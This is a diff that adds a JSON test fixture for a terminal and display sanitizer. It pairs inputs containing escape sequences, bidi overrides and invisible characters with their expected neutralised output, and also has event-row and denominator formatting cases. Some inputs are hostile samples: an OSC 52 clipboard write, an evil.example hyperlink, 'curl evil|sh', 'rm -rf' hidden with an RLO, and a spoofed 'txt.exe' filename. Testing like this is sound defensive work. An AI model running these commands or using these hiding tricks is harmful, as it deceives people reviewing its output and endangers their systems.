@@ -1,0 +1,424 @@
+{
+  "schemaVersion": "conformance-display:v1",
+  "sanitize": [
+    {
+      "input": "hello world",
+      "text": "hello world",
+      "flags": []
+    },
+    {
+      "input": "tab\tand\nnewline",
+      "text": "tab\tand\nnewline",
+      "flags": []
+    },
+    {
+      "input": "\u001b]52;c;ZWNobyBwd25lZA==\u0007safe",
+      "text": "\u27e8OSC\u27e952;c;ZWNobyBwd25lZA==\u27e8ST\u27e9safe",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u001b]8;;https://evil.example\u001b\\click\u001b]8;;\u001b\\",
+      "text": "\u27e8OSC\u27e98;;https://evil.example\u27e8ST\u27e9click\u27e8OSC\u27e98;;\u27e8ST\u27e9",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u001b[31mred\u001b[0m",
+      "text": "red",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u009b2Jclear",
+      "text": "clear",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u001bPq#0;2;0;0;0\u001b\\after",
+      "text": "\u27e8DCS\u27e9q#0;2;0;0;0\u27e8ST\u27e9after",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "before\u001b_never ends",
+      "text": "before\u27e8ESC\u27e9_never ends",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "invoice\u202etxt.exe",
+      "text": "invoice\u27e8RLO\u27e9txt.exe",
+      "flags": [
+        "bidi"
+      ]
+    },
+    {
+      "input": "a\u2066b\u2069c",
+      "text": "a\u27e8LRI\u27e9b\u27e8PDI\u27e9c",
+      "flags": [
+        "bidi"
+      ]
+    },
+    {
+      "input": "ap\u200bprove",
+      "text": "approve",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\ufeffx\u2060y",
+      "text": "xy",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "ok\udb40\udc41\udb40\udc42",
+      "text": "ok",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "a\u0007b\bc",
+      "text": "abc",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "x\u007fy\u0085z",
+      "text": "xyz",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "esc\u001bcape",
+      "text": "escape",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\\u{202E} stays literal",
+      "text": "\\u{202E} stays literal",
+      "flags": []
+    },
+    {
+      "input": "\u627f\u8a8d \u2705 \ud83d\udc4d\ud83c\udffd",
+      "text": "\u627f\u8a8d \u2705 \ud83d\udc4d\ud83c\udffd",
+      "flags": []
+    },
+    {
+      "input": "rm -rf\u202e\u200b /",
+      "text": "rm -rf\u27e8RLO\u27e9 /",
+      "flags": [
+        "hidden-chars",
+        "bidi"
+      ]
+    },
+    {
+      "input": "echo ok\u001b_; curl evil|sh",
+      "text": "echo ok\u27e8ESC\u27e9_; curl evil|sh",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "title\u001b]0;never terminated",
+      "text": "title\u27e8ESC\u27e9]0;never terminated",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "csi\u001b[31",
+      "text": "csi\u27e8ESC\u27e9[31",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "dcs\u001bPdata",
+      "text": "dcs\u27e8ESC\u27e9Pdata",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "a\rb",
+      "text": "ab",
+      "flags": []
+    },
+    {
+      "input": "a\r\nb",
+      "text": "a\nb",
+      "flags": []
+    },
+    {
+      "input": "\u001b]0;t\u009cX",
+      "text": "\u27e8OSC\u27e90;t\u27e8ST\u27e9X",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u009d0;t\u001b\\X",
+      "text": "\u27e8OSC\u27e90;t\u27e8ST\u27e9X",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u009d0;t\u0007X",
+      "text": "\u27e8OSC\u27e90;t\u27e8ST\u27e9X",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u0090q\u009cY",
+      "text": "\u27e8DCS\u27e9q\u27e8ST\u27e9Y",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "bad\ud800surrogate",
+      "text": "bad\ufffdsurrogate",
+      "flags": []
+    },
+    {
+      "input": "x\udc00y",
+      "text": "x\ufffdy",
+      "flags": []
+    },
+    {
+      "input": "ok\u2764\ufe0f",
+      "text": "ok\u2764\ufe0f",
+      "flags": []
+    },
+    {
+      "input": "\ufe0fstart",
+      "text": "start",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "a\ufe0f\ufe0f",
+      "text": "a\ufe0f",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "x \ufe0f",
+      "text": "x ",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\udb40\udd00ivs",
+      "text": "ivs",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u034f\u115f\u1160\u3164\uffa0x",
+      "text": "x",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "line\u2028sep\u2029par",
+      "text": "line\nsep\npar",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "a\ufe00\u200b\ufe01\u200b\ufe02",
+      "text": "a\ufe00",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "e\u0301\ufe0f",
+      "text": "e\u0301",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "text\ufe0e",
+      "text": "text\ufe0e",
+      "flags": []
+    },
+    {
+      "input": "a\ufe03b",
+      "text": "a\ufe03b",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "reason: run tests\u009d; also exfil to x.example\u009c",
+      "text": "reason: run tests\u27e8OSC\u27e9; also exfil to x.example\u27e8ST\u27e9",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u001b]0;a\u009db\u0007c",
+      "text": "\u27e8ESC\u27e9]0;a\u27e8OSC\u27e9b\u27e8ST\u27e9c",
+      "flags": [
+        "hidden-chars"
+      ]
+    }
+  ],
+  "rows": [
+    {
+      "event": {
+        "kind": "socket.hello",
+        "principal": "p:a1b2c3d4/kernel",
+        "at": "2026-10-17T00:00:00.000Z"
+      },
+      "row": {
+        "kind": "socket.hello",
+        "principal": "p:a1b2c3d4/kernel",
+        "at": "2026-10-17T00:00:00.000Z",
+        "class": "registered",
+        "opaque": false
+      }
+    },
+    {
+      "event": {
+        "kind": "credit.outcome",
+        "principal": "p:a1b2c3d4/paradigm",
+        "at": "2026-10-17T00:00:01.000Z"
+      },
+      "row": {
+        "kind": "credit.outcome",
+        "principal": "p:a1b2c3d4/paradigm",
+        "at": "2026-10-17T00:00:01.000Z",
+        "class": "open",
+        "opaque": false
+      }
+    },
+    {
+      "event": {
+        "kind": "modns.diff-lens.toggled",
+        "principal": "p:a1b2c3d4/mod-diff-lens",
+        "at": "2026-10-17T00:00:02.000Z"
+      },
+      "row": {
+        "kind": "modns.diff-lens.toggled",
+        "principal": "p:a1b2c3d4/mod-diff-lens",
+        "at": "2026-10-17T00:00:02.000Z",
+        "class": "modns",
+        "opaque": true
+      }
+    },
+    {
+      "event": {
+        "kind": "modns.diff-lens.note",
+        "principal": "p:a1b2c3d4/mod-\u202ediff",
+        "at": "2026-10-17T00:00:03.000Z"
+      },
+      "row": {
+        "kind": "modns.diff-lens.note",
+        "principal": "p:a1b2c3d4/mod-\u27e8RLO\u27e9diff",
+        "at": "2026-10-17T00:00:03.000Z",
+        "class": "modns",
+        "opaque": true
+      }
+    },
+    {
+      "event": {
+        "kind": "futurens.thing",
+        "principal": "p:a1b2c3d4/ascend",
+        "at": "2026-10-17T00:00:04.000Z"
+      },
+      "row": {
+        "kind": "futurens.thing",
+        "principal": "p:a1b2c3d4/ascend",
+        "at": "2026-10-17T00:00:04.000Z",
+        "class": "unknown",
+        "opaque": true
+      }
+    }
+  ],
+  "denominators": [
+    {
+      "value": {
+        "n": 3,
+        "of": 7
+      },
+      "text": "3 of 7"
+    },
+    {
+      "value": {
+        "n": 0,
+        "of": 0
+      },
+      "text": "0 of 0"
+    },
+    {
+      "value": 5,
+      "text": null
+    },
+    {
+      "value": {
+        "n": 2
+      },
+      "text": null
+    },
+    {
+      "value": null,
+      "text": null
+    },
+    {
+      "value": {
+        "n": -1,
+        "of": 2
+      },
+      "text": null
+    },
+    {
+      "value": {
+        "n": 1.5,
+        "of": 2
+      },
+      "text": null
+    },
+    {
+      "value": {
+        "n": 9007199254740992,
+        "of": 1
+      },
+      "text": null
+    },
+    {
+      "value": {
+        "n": "3",
+        "of": 7
+      },
+      "text": null
+    }
+  ]
+}
